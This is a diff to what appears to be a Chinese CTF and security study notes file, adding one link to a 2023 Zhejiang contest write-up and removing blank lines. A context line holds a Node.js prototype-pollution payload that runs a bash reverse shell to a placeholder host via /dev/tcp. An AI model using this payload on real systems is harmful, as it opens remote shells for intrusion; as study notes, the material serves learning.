@@ -624,7 +624,6 @@ print(random_number)  # 输出一个随机选择的数字
 ## Lua
 [教程地址](https://www.runoob.com/lua/lua-tutorial.html)
 
-
 ---
 ## MD5
 ---
@@ -1014,7 +1013,6 @@ app.listen(3000, function () {
 {"shit":1,"__proto__":{"shellcode":"let res = import('./foo.js');res.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync('bash -c \"bash -i >& /dev/tcp/ip/6666 0>&1\"').toString();"}}
 ```
 
-
 ---
 ## Crypto
 
@@ -1229,3 +1227,4 @@ https://www.cnblogs.com/jasy/p/14354125.html
 https://blog.csdn.net/whatday/article/details/85247901
 https://blog.csdn.net/weixin_47306547/article/details/120285264
 https://blog.csdn.net/Suyebiubiu/article/details/108602854
+[2023浙江省大学生网络与信息安全决赛-Misc篇](https://blog.zgsec.cn/archives/504.html?scroll=comment-98)
